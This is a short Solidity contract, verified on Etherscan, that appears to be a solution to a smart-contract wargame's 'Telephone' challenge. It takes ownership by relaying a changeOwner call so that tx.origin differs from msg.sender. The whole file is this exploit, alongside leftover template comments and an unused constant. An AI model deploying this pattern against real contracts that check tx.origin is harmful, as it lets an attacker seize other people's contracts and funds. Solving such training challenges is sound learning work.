/**
 *Submitted for verification at Etherscan.io on 2022-05-26
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

interface ITelephoneChallenge {
    function changeOwner(address _owner) external;
}
/**
 * @title Storage
 * @dev Store & retrieve value in a variable
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract HackTelephone {

    ITelephoneChallenge public challenge;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address challengeAddress) {
        challenge = ITelephoneChallenge(challengeAddress);
    }


    function attack() external payable {
        challenge.changeOwner(tx.origin);
    }
}